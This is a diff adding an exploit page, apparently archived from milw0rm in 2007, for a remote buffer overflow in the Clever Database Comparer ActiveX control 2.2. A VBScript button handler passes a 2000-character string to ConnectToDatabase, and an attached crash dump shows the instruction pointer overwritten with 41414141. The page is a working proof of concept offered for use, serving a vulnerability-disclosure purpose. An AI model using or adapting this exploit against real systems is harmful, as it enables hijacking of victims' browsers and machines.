@@ -1,0 +1,60 @@
+<pre>
+<span style="font: 14pt Courier New;"><p align="center"><b>2007/05/14</b></p></span>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------
+ <b>Clever Database Comparer ActiveX version 2.2 Remote Buffer Overflow Exploit</b>
+ url: http://www.clevercomponents.com/home/news.asp
+ price: from $49.99 to $149.19
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ 
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ all software that use this ocx are vulnerable to these exploits.
+-----------------------------------------------------------------------------
+<object classid='clsid:24E0CD64-A8DE-4BE4-9706-4CFC89D212C9' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+<script language = 'vbscript'>
+Sub tryMe
+buff = String(2000,"A")
+test.ConnectToDatabase buff,"default", "default", "default", "default"
+End Sub
+</script>
+
+faultmon dump:
+12:58:35.492  pid=0570 tid=07FC  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
+              ----------------------------------------------------------------
+              EAX=01D04141: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
+              EBX=41418282: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=01D0EA01: 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+              EDX=00000001: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ESP=01D0E510: 58 DD 0A 03 41 41 41 41-41 41 41 41 00 00 14 00
+              EBP=01D0E540: E0 EA D0 01 28 6F 93 03-41 41 41 41 58 DD 0A 03
+              ESI=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDI=030ADD58: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
+              EIP=039316BC: 38 0E 74 1F 66 85 D2 6A-00 74 07 68 C8 32 95 03
+                            --> CMP [ESI],CL
+              ----------------------------------------------------------------
+
+12:58:35.492  pid=0570 tid=07FC  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
+              ----------------------------------------------------------------
+              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
+              ESP=01D0E140: BF 37 91 7C 28 E2 D0 01-28 EC D0 01 44 E2 D0 01
+              EBP=01D0E160: 10 E2 D0 01 8B 37 91 7C-28 E2 D0 01 28 EC D0 01
+              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                            --> N/A
+              ----------------------------------------------------------------
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-05-14]
